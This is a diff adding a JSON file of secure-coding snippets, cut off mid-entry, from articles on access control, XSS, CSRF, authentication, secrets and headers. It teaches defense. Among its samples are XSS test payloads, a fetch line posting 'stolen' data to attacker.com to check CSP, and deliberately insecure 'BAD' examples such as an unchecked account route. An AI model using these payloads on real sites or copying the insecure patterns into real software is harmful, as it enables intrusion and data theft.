@@ -1,0 +1,797 @@
+[
+  {
+    "id": "access-control-0",
+    "title": "Broken Access Control Prevention - Snippet 1",
+    "description": "Code example from Broken Access Control Prevention",
+    "language": "javascript",
+    "code": "// BAD: Trusting the user-supplied ID without verification\r\napp.get('/api/accounts/:id', (req, res) => {\r\n    const account = db.getAccount(req.params.id);\r\n    res.json(account);\r\n});",
+    "articleId": "access-control",
+    "articleTitle": "Broken Access Control Prevention",
+    "tags": [
+      "rbac",
+      "abac",
+      "idor",
+      "middleware"
+    ]
+  },
+  {
+    "id": "access-control-1",
+    "title": "Broken Access Control Prevention - Snippet 2",
+    "description": "Code example from Broken Access Control Prevention",
+    "language": "javascript",
+    "code": "// GOOD: verifying ownership\r\napp.get('/api/accounts/:id', (req, res) => {\r\n    const account = db.getAccount(req.params.id);\r\n    \r\n    // Check if the verified user owns this account\r\n    if (account.ownerId !== req.user.id) {\r\n        return res.status(403).json({ error: 'Access Denied' });\r\n    }\r\n    \r\n    res.json(account);\r\n});",
+    "articleId": "access-control",
+    "articleTitle": "Broken Access Control Prevention",
+    "tags": [
+      "rbac",
+      "abac",
+      "idor",
+      "middleware"
+    ]
+  },
+  {
+    "id": "access-control-2",
+    "title": "Broken Access Control Prevention - Snippet 3",
+    "description": "Code example from Broken Access Control Prevention",
+    "language": "typescript",
+    "code": "// middleware/auth.ts\r\nexport function requireRole(role: string) {\r\n    return (req, res, next) => {\r\n        if (!req.user || req.user.role !== role) {\r\n            return res.status(403).send('Forbidden');\r\n        }\r\n        next();\r\n    };\r\n}\r\n\r\n// routes.ts\r\nrouter.delete('/users/:id', requireRole('ADMIN'), deleteUserHandler);",
+    "articleId": "access-control",
+    "articleTitle": "Broken Access Control Prevention",
+    "tags": [
+      "rbac",
+      "abac",
+      "idor",
+      "middleware"
+    ]
+  },
+  {
+    "id": "api-security-0",
+    "title": "API Security - Snippet 1",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "// Express.js with passport-oauth2\r\napp.get('/api/user', passport.authenticate('oauth2'), (req, res) => {\r\n  res.json(req.user);\r\n});",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-1",
+    "title": "API Security - Snippet 2",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "// Signing\r\nconst token = jwt.sign({ userId: user.id }, process.env.SECRET_KEY, {\r\n  algorithm: 'HS256',\r\n  expiresIn: '1h'\r\n});\r\n\r\n// Verification\r\nconst decoded = jwt.verify(token, process.env.SECRET_KEY, {\r\n  algorithms: ['HS256']\r\n});",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-2",
+    "title": "API Security - Snippet 3",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "app.use((req, res, next) => {\r\n  const apiKey = req.headers['x-api-key'];\r\n  if (!validateApiKey(apiKey)) {\r\n    return res.status(401).json({ error: 'Unauthorized' });\r\n  }\r\n  next();\r\n});",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-3",
+    "title": "API Security - Snippet 4",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "import rateLimit from 'express-rate-limit';\r\n\r\nconst limiter = rateLimit({\r\n  windowMs: 15 * 60 * 1000, // 15 minutes\r\n  max: 100, // limit each IP to 100 requests per windowMs\r\n  message: 'Too many requests from this IP, please try again later.'\r\n});\r\n\r\napp.use('/api/', limiter);",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-4",
+    "title": "API Security - Snippet 5",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "import { body, validationResult } from 'express-validator';\r\n\r\napp.post('/api/users', [\r\n  body('email').isEmail().normalizeEmail(),\r\n  body('password').isLength({ min: 12 }).trim(),\r\n  body('age').isInt({ min: 0, max: 150 })\r\n], (req, res) => {\r\n  const errors = validationResult(req);\r\n  if (!errors.isEmpty()) {\r\n    return res.status(400).json({ errors: errors.array() });\r\n  }\r\n  // Process request\r\n});",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-5",
+    "title": "API Security - Snippet 6",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "// Enforce maximum page size\r\nconst limit = Math.min(req.query.limit || 20, 100); // Max 100 items\r\nconst offset = Math.max(0, req.query.offset || 0);\r\n\r\nconst users = await prisma.user.findMany({\r\n  take: limit,\r\n  skip: offset\r\n});",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-6",
+    "title": "API Security - Snippet 7",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "// API versioning via URL path\r\napp.use('/api/v1/', require('./routes/v1'));\r\napp.use('/api/v2/', require('./routes/v2'));",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-7",
+    "title": "API Security - Snippet 8",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "import cors from 'cors';\r\n\r\nconst whitelist = ['https://trusted-app.com', 'https://app.example.com'];\r\n\r\napp.use(cors({\r\n  origin: (origin, callback) => {\r\n    if (whitelist.includes(origin) || !origin) {\r\n      callback(null, true);\r\n    } else {\r\n      callback(new Error('Not allowed by CORS'));\r\n    }\r\n  },\r\n  credentials: true\r\n}));",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-8",
+    "title": "API Security - Snippet 9",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "// BAD\r\ncatch (err) {\r\n  res.status(500).json({ error: err.message, stack: err.stack });\r\n}\r\n\r\n// GOOD\r\ncatch (err) {\r\n  logger.error(err); // Log internally\r\n  res.status(500).json({ error: 'Internal Server Error' });\r\n}",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-9",
+    "title": "API Security - Snippet 10",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "import depthLimit from 'graphql-depth-limit';\r\n\r\napp.use('/graphql', graphqlHTTP({\r\n  schema: mySchema,\r\n  validationRules: [depthLimit(7)]\r\n}));",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "api-security-10",
+    "title": "API Security - Snippet 11",
+    "description": "Code example from API Security",
+    "language": "javascript",
+    "code": "import { createComplexityLimitRule } from 'graphql-validation-complexity';\r\n\r\nconst complexityRule = createComplexityLimitRule({\r\n  onComplete: (complexity) => console.log(`Query complexity: ${complexity}`)\r\n});",
+    "articleId": "api-security",
+    "articleTitle": "API Security",
+    "tags": [
+      "api",
+      "rest",
+      "graphql",
+      "oauth",
+      "rate-limiting"
+    ]
+  },
+  {
+    "id": "cross-site-scripting-prevention-0",
+    "title": "Cross-Site Scripting (XSS) Prevention - Snippet 1",
+    "description": "Code example from Cross-Site Scripting (XSS) Prevention",
+    "language": "jsx",
+    "code": "const userContent = \"<img src=x onerror=alert(1)>\";\r\n\r\n// SAFE: React renders this as plain text\r\nreturn <div>{userContent}</div>;",
+    "articleId": "cross-site-scripting-prevention",
+    "articleTitle": "Cross-Site Scripting (XSS) Prevention",
+    "tags": [
+      "xss",
+      "start",
+      "csp",
+      "react"
+    ]
+  },
+  {
+    "id": "cross-site-scripting-prevention-1",
+    "title": "Cross-Site Scripting (XSS) Prevention - Snippet 2",
+    "description": "Code example from Cross-Site Scripting (XSS) Prevention",
+    "language": "jsx",
+    "code": "import DOMPurify from 'dompurify';\r\n\r\n// RISKY\r\n<div dangerouslySetInnerHTML={{ __html: userContent }} />\r\n\r\n// SECURE\r\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userContent) }} />",
+    "articleId": "cross-site-scripting-prevention",
+    "articleTitle": "Cross-Site Scripting (XSS) Prevention",
+    "tags": [
+      "xss",
+      "start",
+      "csp",
+      "react"
+    ]
+  },
+  {
+    "id": "cross-site-scripting-prevention-2",
+    "title": "Cross-Site Scripting (XSS) Prevention - Snippet 3",
+    "description": "Code example from Cross-Site Scripting (XSS) Prevention",
+    "language": "http",
+    "code": "Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; img-src 'self' data:;",
+    "articleId": "cross-site-scripting-prevention",
+    "articleTitle": "Cross-Site Scripting (XSS) Prevention",
+    "tags": [
+      "xss",
+      "start",
+      "csp",
+      "react"
+    ]
+  },
+  {
+    "id": "cross-site-scripting-prevention-3",
+    "title": "Cross-Site Scripting (XSS) Prevention - Snippet 4",
+    "description": "Code example from Cross-Site Scripting (XSS) Prevention",
+    "language": "javascript",
+    "code": "// Express.js Example\r\nres.cookie('session_id', 'xyz123', {\r\n  httpOnly: true, // Crucial: prevents JS from reading\r\n  secure: true,   // Send only over HTTPS\r\n  sameSite: 'strict' // Prevent CSRF via cookies\r\n});",
+    "articleId": "cross-site-scripting-prevention",
+    "articleTitle": "Cross-Site Scripting (XSS) Prevention",
+    "tags": [
+      "xss",
+      "start",
+      "csp",
+      "react"
+    ]
+  },
+  {
+    "id": "cross-site-scripting-prevention-4",
+    "title": "Cross-Site Scripting (XSS) Prevention - Snippet 5",
+    "description": "Code example from Cross-Site Scripting (XSS) Prevention",
+    "language": "javascript",
+    "code": "// Common XSS payloads to test with\r\nconst xssPayloads = [\r\n  '<script>alert(1)</script>',\r\n  '<img src=x onerror=alert(1)>',\r\n  '<svg onload=alert(1)>',\r\n  'javascript:alert(1)',\r\n  '<iframe src=\"javascript:alert(1)\">',\r\n  '<body onload=alert(1)>'\r\n];\r\n\r\n// In React:\r\nxssPayloads.forEach(payload => {\r\n  // If React safely escapes, nothing should execute\r\n  const { rerender } = render(<div>{payload}</div>);\r\n  // ✓ If you don't see an alert, React protected you\r\n});\r\n\r\n// Browser console to verify CSP\r\nfetch('http://attacker.com', { method: 'POST', body: 'stolen' });\r\n// Should be blocked by CSP if script-src doesn't include attacker.com",
+    "articleId": "cross-site-scripting-prevention",
+    "articleTitle": "Cross-Site Scripting (XSS) Prevention",
+    "tags": [
+      "xss",
+      "start",
+      "csp",
+      "react"
+    ]
+  },
+  {
+    "id": "csrf-protection-0",
+    "title": "CSRF Protection - Snippet 1",
+    "description": "Code example from CSRF Protection",
+    "language": "html",
+    "code": "<form action=\"/update-profile\" method=\"POST\">\r\n  <input type=\"hidden\" name=\"csrf_token\" value=\"random_generated_token_123\" />\r\n  <!-- other fields -->\r\n</form>",
+    "articleId": "csrf-protection",
+    "articleTitle": "CSRF Protection",
+    "tags": [
+      "csrf",
+      "tokens",
+      "cookies"
+    ]
+  },
+  {
+    "id": "csrf-protection-1",
+    "title": "CSRF Protection - Snippet 2",
+    "description": "Code example from CSRF Protection",
+    "language": "javascript",
+    "code": "import session from 'express-session';\r\nimport csrf from 'csurf';\r\nimport cookieParser from 'cookie-parser';\r\n\r\napp.use(cookieParser());\r\napp.use(session({\r\n  secret: process.env.SESSION_SECRET,\r\n  resave: false,\r\n  saveUninitialized: true\r\n}));\r\n\r\nconst csrfProtection = csrf({ cookie: false }); // Use session, not cookies\r\n\r\n// Form rendering\r\napp.get('/profile', csrfProtection, (req, res) => {\r\n  res.render('profile', { csrfToken: req.csrfToken() });\r\n});\r\n\r\n// Form submission\r\napp.post('/profile', csrfProtection, (req, res) => {\r\n  // If token doesn't match, middleware will reject\r\n  // Update user profile\r\n  res.json({ success: true });\r\n});",
+    "articleId": "csrf-protection",
+    "articleTitle": "CSRF Protection",
+    "tags": [
+      "csrf",
+      "tokens",
+      "cookies"
+    ]
+  },
+  {
+    "id": "csrf-protection-2",
+    "title": "CSRF Protection - Snippet 3",
+    "description": "Code example from CSRF Protection",
+    "language": "javascript",
+    "code": "res.cookie('session_id', sessionToken, {\r\n  sameSite: 'strict', // 'strict' | 'lax' | 'none'\r\n  httpOnly: true,\r\n  secure: true // HTTPS only\r\n});",
+    "articleId": "csrf-protection",
+    "articleTitle": "CSRF Protection",
+    "tags": [
+      "csrf",
+      "tokens",
+      "cookies"
+    ]
+  },
+  {
+    "id": "dependency-management-enhanced-0",
+    "title": "Dependency Management - Snippet 1",
+    "description": "Code example from Dependency Management",
+    "language": "bash",
+    "code": "# 1. Check for vulnerabilities\r\nnpm audit\r\n\r\n# 2. Auto-fix where possible\r\nnpm audit fix\r\n\r\n# 3. Review what needs fixing\r\nnpm audit --json > audit-report.json\r\n\r\n# 4. Update with review\r\nnpm update",
+    "articleId": "dependency-management-enhanced",
+    "articleTitle": "Dependency Management",
+    "tags": [
+      "dependencies",
+      "sca",
+      "npm"
+    ]
+  },
+  {
+    "id": "dependency-management-enhanced-1",
+    "title": "Dependency Management - Snippet 2",
+    "description": "Code example from Dependency Management",
+    "language": "bash",
+    "code": "# Check a package before installing\r\nnpm view lodash vulnerabilities\r\n\r\n# Better: Use Snyk CLI\r\nsnyk test npm:lodash@4.17.20",
+    "articleId": "dependency-management-enhanced",
+    "articleTitle": "Dependency Management",
+    "tags": [
+      "dependencies",
+      "sca",
+      "npm"
+    ]
+  },
+  {
+    "id": "dependency-management-enhanced-2",
+    "title": "Dependency Management - Snippet 3",
+    "description": "Code example from Dependency Management",
+    "language": "json",
+    "code": "{\r\n  \"engines\": {\r\n    \"node\": \">=18.0.0\",\r\n    \"npm\": \">=9.0.0\"\r\n  },\r\n  \"publishConfig\": {\r\n    \"access\": \"restricted\"\r\n  }\r\n}",
+    "articleId": "dependency-management-enhanced",
+    "articleTitle": "Dependency Management",
+    "tags": [
+      "dependencies",
+      "sca",
+      "npm"
+    ]
+  },
+  {
+    "id": "dependency-management-enhanced-3",
+    "title": "Dependency Management - Snippet 4",
+    "description": "Code example from Dependency Management",
+    "language": "yaml",
+    "code": "# GitHub Dependabot (example)\r\nversion: 2\r\nupdates:\r\n  - package-ecosystem: 'npm'\r\n    directory: '/'\r\n    schedule:\r\n      interval: 'daily'\r\n    open-pull-requests-limit: 5\r\n    reviewers:\r\n      - 'security-team'",
+    "articleId": "dependency-management-enhanced",
+    "articleTitle": "Dependency Management",
+    "tags": [
+      "dependencies",
+      "sca",
+      "npm"
+    ]
+  },
+  {
+    "id": "input-validation-0",
+    "title": "Input Validation Strategy - Snippet 1",
+    "description": "Code example from Input Validation Strategy",
+    "language": "typescript",
+    "code": "import { z } from 'zod';\r\n\r\nconst UserSignupSchema = z.object({\r\n  username: z.string()\r\n    .min(3, { message: \"Username must be at least 3 chars\" })\r\n    .max(20)\r\n    .regex(/^[a-zA-Z0-9_]+$/, \"Only alphanumeric and underscore allowed\"),\r\n    \r\n  email: z.string().email(),\r\n  \r\n  age: z.number().min(18).optional(),\r\n});",
+    "articleId": "input-validation",
+    "articleTitle": "Input Validation Strategy",
+    "tags": [
+      "validation",
+      "sanitization",
+      "zod",
+      "regex"
+    ]
+  },
+  {
+    "id": "input-validation-1",
+    "title": "Input Validation Strategy - Snippet 2",
+    "description": "Code example from Input Validation Strategy",
+    "language": "typescript",
+    "code": "// app/api/signup/route.ts\r\nexport async function POST(request: Request) {\r\n  const body = await request.json();\r\n\r\n  // Validate\r\n  const result = UserSignupSchema.safeParse(body);\r\n\r\n  if (!result.success) {\r\n    // Return precise error messages\r\n    return Response.json(\r\n      { errors: result.error.flatten().fieldErrors }, \r\n      { status: 400 }\r\n    );\r\n  }\r\n\r\n  // Proceed with safe data\r\n  const safeData = result.data; // Typed as { username: string, ... }\r\n  await db.createUser(safeData);\r\n}",
+    "articleId": "input-validation",
+    "articleTitle": "Input Validation Strategy",
+    "tags": [
+      "validation",
+      "sanitization",
+      "zod",
+      "regex"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-0",
+    "title": "Logging & Monitoring - Snippet 1",
+    "description": "Code example from Logging & Monitoring",
+    "language": "json",
+    "code": "{\r\n  \"timestamp\": \"2023-10-27T10:00:00Z\",\r\n  \"level\": \"WARN\",\r\n  \"event\": \"auth_failure\",\r\n  \"user_id\": \"user_123\",\r\n  \"ip_address\": \"192.168.1.1\",\r\n  \"message\": \"Invalid password provided\"\r\n}",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-1",
+    "title": "Logging & Monitoring - Snippet 2",
+    "description": "Code example from Logging & Monitoring",
+    "language": "javascript",
+    "code": "import winston from 'winston';\r\n\r\nconst logger = winston.createLogger({\r\n  level: 'info',\r\n  format: winston.format.json(),\r\n  defaultMeta: { service: 'auth-service' },\r\n  transports: [\r\n    new winston.transports.File({ filename: 'error.log', level: 'error' }),\r\n    new winston.transports.File({ filename: 'combined.log' })\r\n  ]\r\n});\r\n\r\n// Usage\r\nlogger.warn('auth_failure', {\r\n  userId: user.id,\r\n  ipAddress: req.ip,\r\n  attempt: 'failed_password',\r\n  timestamp: new Date().toISOString()\r\n});",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-2",
+    "title": "Logging & Monitoring - Snippet 3",
+    "description": "Code example from Logging & Monitoring",
+    "language": "javascript",
+    "code": "// ✓ Log these\r\nlogger.log('user_login_success', { userId, ipAddress, timestamp });\r\nlogger.log('user_login_failure', { email, reason: 'invalid_password' });\r\nlogger.log('permission_denied', { userId, resource, action });\r\nlogger.log('role_change', { userId, newRole, changedBy });\r\nlogger.log('api_key_generated', { userId, keyPrefix });\r\nlogger.log('suspicious_activity', { userId, activity: 'multiple_failed_attempts' });\r\n\r\n// ✗ Never log these\r\n// logger.log('password_entered', { password }); // NEVER\r\n// logger.log('api_response', { body: response.body }); // May contain PII\r\n// logger.log('user_data', { ssn, creditCard }); // NEVER",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-3",
+    "title": "Logging & Monitoring - Snippet 4",
+    "description": "Code example from Logging & Monitoring",
+    "language": "javascript",
+    "code": "const alerts = {\r\n  failedLoginAttempts: { threshold: 5, window: '5m' },\r\n  unusualLocationLogin: { threshold: 1, action: 'notify_user' },\r\n  apiErrorRate: { threshold: '5%', action: 'page_oncall' },\r\n  databaseSlowQueryTime: { threshold: '1s', window: '1h' }\r\n};\r\n\r\n// Example: Alert if 5 failed logins from same IP in 5 minutes\r\nif (failedAttemptsCount >= 5) {\r\n  await alertSecurityTeam({\r\n    severity: 'high',\r\n    message: `Suspicious login activity: ${ipAddress}`,\r\n    recommendation: 'Consider temporarily blocking this IP'\r\n  });\r\n}",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-4",
+    "title": "Logging & Monitoring - Snippet 5",
+    "description": "Code example from Logging & Monitoring",
+    "language": "javascript",
+    "code": "// Retention policy example\r\nconst logRetention = {\r\n  INFO: '30 days',\r\n  WARN: '90 days',\r\n  ERROR: '1 year',\r\n  SECURITY_EVENT: '2 years'\r\n};\r\n\r\n// Archive and compress old logs\r\n// Ensure compliance with GDPR (right to deletion)\r\n// For PII in logs: implement log scrubbing",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-5",
+    "title": "Logging & Monitoring - Snippet 6",
+    "description": "Code example from Logging & Monitoring",
+    "language": "javascript",
+    "code": "import elasticsearch from '@elastic/elasticsearch';\r\n\r\nconst client = new elasticsearch.Client({ node: 'http://localhost:9200' });\r\n\r\nasync function logSecurityEvent(event) {\r\n  await client.index({\r\n    index: 'security-logs',\r\n    body: event\r\n  });\r\n}",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-enhanced-6",
+    "title": "Logging & Monitoring - Snippet 7",
+    "description": "Code example from Logging & Monitoring",
+    "language": "javascript",
+    "code": "import StatsD from 'node-statsd';\r\n\r\nconst dogstatsd = new StatsD({\r\n  host: 'localhost',\r\n  port: 8125\r\n});\r\n\r\n// Log and emit metric\r\nlogger.error('auth_failed');\r\ndogstatsd.increment('security.auth_failures');",
+    "articleId": "logging-monitoring-enhanced",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "logging-monitoring-0",
+    "title": "Logging & Monitoring - Snippet 1",
+    "description": "Code example from Logging & Monitoring",
+    "language": "json",
+    "code": "{\r\n  \"timestamp\": \"2023-10-27T10:00:00Z\",\r\n  \"level\": \"WARN\",\r\n  \"event\": \"auth_failure\",\r\n  \"user_id\": \"user_123\",\r\n  \"ip_address\": \"192.168.1.1\",\r\n  \"message\": \"Invalid password provided\"\r\n}",
+    "articleId": "logging-monitoring",
+    "articleTitle": "Logging & Monitoring",
+    "tags": [
+      "logging",
+      "monitoring",
+      "observability"
+    ]
+  },
+  {
+    "id": "secrets-management-0",
+    "title": "Secrets Management - Snippet 1",
+    "description": "Code example from Secrets Management",
+    "language": "javascript",
+    "code": "// app.js (Node.js)\r\nrequire('dotenv').config();\r\n\r\nconst dbPassword = process.env.DB_PASSWORD; // Safe",
+    "articleId": "secrets-management",
+    "articleTitle": "Secrets Management",
+    "tags": [
+      "secrets",
+      "env",
+      "vault",
+      "ci/cd"
+    ]
+  },
+  {
+    "id": "secrets-management-1",
+    "title": "Secrets Management - Snippet 2",
+    "description": "Code example from Secrets Management",
+    "language": "json",
+    "code": "{\r\n  \"Version\": \"2012-10-17\",\r\n  \"Statement\": [\r\n    {\r\n      \"Effect\": \"Allow\",\r\n      \"Action\": [\"s3:GetObject\"],\r\n      \"Resource\": \"arn:aws:s3:::my-app-bucket/my-service-data/*\"\r\n    }\r\n  ]\r\n}",
+    "articleId": "secrets-management",
+    "articleTitle": "Secrets Management",
+    "tags": [
+      "secrets",
+      "env",
+      "vault",
+      "ci/cd"
+    ]
+  },
+  {
+    "id": "secrets-management-2",
+    "title": "Secrets Management - Snippet 3",
+    "description": "Code example from Secrets Management",
+    "language": "yaml",
+    "code": "# GitHub Actions Example\r\njobs:\r\n  deploy:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - name: Deploy to production\r\n        env:\r\n          DATABASE_URL: ${{ secrets.DATABASE_URL }}\r\n          API_KEY: ${{ secrets.API_KEY }}\r\n        run: npm run deploy",
+    "articleId": "secrets-management",
+    "articleTitle": "Secrets Management",
+    "tags": [
+      "secrets",
+      "env",
+      "vault",
+      "ci/cd"
+    ]
+  },
+  {
+    "id": "secrets-management-3",
+    "title": "Secrets Management - Snippet 4",
+    "description": "Code example from Secrets Management",
+    "language": "javascript",
+    "code": "// BAD\r\nconsole.log('Connecting with key:', apiKey);\r\n\r\n// GOOD\r\nconsole.log('Connecting to API...');\r\nconst result = await callApi(apiKey); // Key stays in memory, never logged",
+    "articleId": "secrets-management",
+    "articleTitle": "Secrets Management",
+    "tags": [
+      "secrets",
+      "env",
+      "vault",
+      "ci/cd"
+    ]
+  },
+  {
+    "id": "secure-authentication-0",
+    "title": "Secure Authentication - Snippet 1",
+    "description": "Code example from Secure Authentication",
+    "language": "javascript",
+    "code": "import bcrypt from 'bcrypt';\r\n\r\nconst saltRounds = 10;\r\nconst plainPassword = 'mySuperSecretPassword';\r\n\r\n// Hashing (Registration)\r\nconst hash = await bcrypt.hash(plainPassword, saltRounds);\r\n\r\n// Verification (Login)\r\nconst match = await bcrypt.compare(inputPassword, hash);\r\nif (match) {\r\n    // Login success\r\n}",
+    "articleId": "secure-authentication",
+    "articleTitle": "Secure Authentication",
+    "tags": [
+      "auth",
+      "mfa",
+      "oauth",
+      "passwords"
+    ]
+  },
+  {
+    "id": "secure-authentication-1",
+    "title": "Secure Authentication - Snippet 2",
+    "description": "Code example from Secure Authentication",
+    "language": "javascript",
+    "code": "import axios from 'axios';\r\nimport sha1 from 'sha1';\r\n\r\nasync function isPasswordBreached(password) {\r\n  // Use HaveIBeenPwned Pwned Passwords API\r\n  const hash = sha1(password).toUpperCase();\r\n  const prefix = hash.substring(0, 5);\r\n  const suffix = hash.substring(5);\r\n\r\n  try {\r\n    const response = await axios.get(\r\n      `https://api.pwnedpasswords.com/range/${prefix}`,\r\n      { timeout: 5000 }\r\n    );\r\n\r\n    // Check if our suffix is in the response\r\n    const breached = response.data.includes(suffix);\r\n    return breached;\r\n  } catch (err) {\r\n    // On error, fail open (allow password) rather than blocking user\r\n    console.error('Breached password check failed:', err);\r\n    return false;\r\n  }\r\n}\r\n\r\n// During registration\r\nif (await isPasswordBreached(newPassword)) {\r\n  throw new Error('This password has been found in data breaches. Please choose another.');\r\n}",
+    "articleId": "secure-authentication",
+    "articleTitle": "Secure Authentication",
+    "tags": [
+      "auth",
+      "mfa",
+      "oauth",
+      "passwords"
+    ]
+  },
+  {
+    "id": "secure-authentication-2",
+    "title": "Secure Authentication - Snippet 3",
+    "description": "Code example from Secure Authentication",
+    "language": "javascript",
+    "code": "import rateLimit from 'express-rate-limit';\r\nimport RedisStore from 'rate-limit-redis';\r\nimport redis from 'redis';\r\n\r\nconst redisClient = redis.createClient();\r\n\r\nconst loginLimiter = rateLimit({\r\n  store: new RedisStore({\r\n    client: redisClient,\r\n    prefix: 'login-limit:'\r\n  }),\r\n  windowMs: 15 * 60 * 1000, // 15 minutes\r\n  max: 5, // 5 failed attempts\r\n  message: 'Too many login attempts, please try again later.'\r\n});\r\n\r\napp.post('/login', loginLimiter, async (req, res) => {\r\n  // Handle login\r\n});",
+    "articleId": "secure-authentication",
+    "articleTitle": "Secure Authentication",
+    "tags": [
+      "auth",
+      "mfa",
+      "oauth",
+      "passwords"
+    ]
+  },
+  {
+    "id": "secure-headers-0",
+    "title": "Secure Headers - Snippet 1",
+    "description": "Code example from Secure Headers",
+    "language": "javascript",
+    "code": "module.exports = {\r\n  async headers() {\r\n    return [\r\n      {\r\n        source: '/(.*)',\r\n        headers: [\r\n          { key: 'X-Content-Type-Options', value: 'nosniff' },\r\n          { key: 'X-Frame-Options', value: 'DENY' },\r\n          { key: 'X-XSS-Protection', value: '1; mode=block' },\r\n          { \r\n            key: 'Strict-Transport-Security', \r\n            value: 'max-age=31536000; includeSubDomains; preload' \r\n          },\r\n          { \r\n            key: 'Content-Security-Policy', \r\n            value: \"default-src 'self'; script-src 'self' 'unsafe-inline'; img-src 'self' data:\" \r\n          },\r\n          { \r\n            key: 'Permissions-Policy', \r\n            value: 'camera=(), microphone=(), geolocation=()' \r\n          }\r\n        ],\r\n      },\r\n    ];\r\n  },\r\n};",
+    "articleId": "secure-headers",
+    "articleTitle": "Secure Headers",
+    "tags": [
+      "headers",
+      "http",
+      "hsts"
+    ]
+  },
+  {
+    "id": "secure-headers-1",
+    "title": "Secure Headers - Snippet 2",
+    "description": "Code example from Secure Headers",
+    "language": "javascript",
+    "code": "import helmet from 'helmet';\r\n\r\napp.use(helmet({\r\n  contentSecurityPolicy: {\r\n    directives: {\r\n      defaultSrc: [\"'self'\"],\r\n      scriptSrc: [\"'self'\"],\r\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\r\n      imgSrc: [\"'self'\", 'data:', 'https:'],\r\n    }\r\n  },\r\n  hsts: {\r\n    maxAge: 31536000, // 1 year\r\n    includeSubDomains: true,\r\n    preload: true\r\n  },\r\n  frameguard: {\r\n    action: 'deny'\r\n  }\r\n}));",
+    "articleId": "secure-headers",
+    "articleTitle": "Secure Headers",
+    "tags": [
+      "headers",
+      "http",
+      "hsts"
+    ]
+  },
+  {
+    "id": "secure-headers-2",
+    "title": "Secure Headers - Snippet 3",
+    "description": "Code example from Secure Headers",
+    "language": "bash",
+    "code": "# Use curl to check headers\r\ncurl -I https://your-app.com\r\n\r\n# Look for presence of:\r\n# Strict-Transport-Security\r\n# X-Content-Type-Options: nosniff\r\n# X-Frame-Options: DENY\r\n# Content-Security-Policy\r\n\r\n# Online tool\r\n# https://securityheaders.com",
+    "articleId": "secure-headers",
+    "articleTitle": "Secure Headers",
+    "tags": [
+      "headers",
+      "http",
+      "hsts"
+    ]
+  },
+  {
+    "id": "sql-injection-prevention-0",
+    "title": "SQL Injection (SQLi) Prevention - Snippet 1",
+    "description": "Code example from SQL Injection (SQLi) Prevention",
+    "language": "javascript",
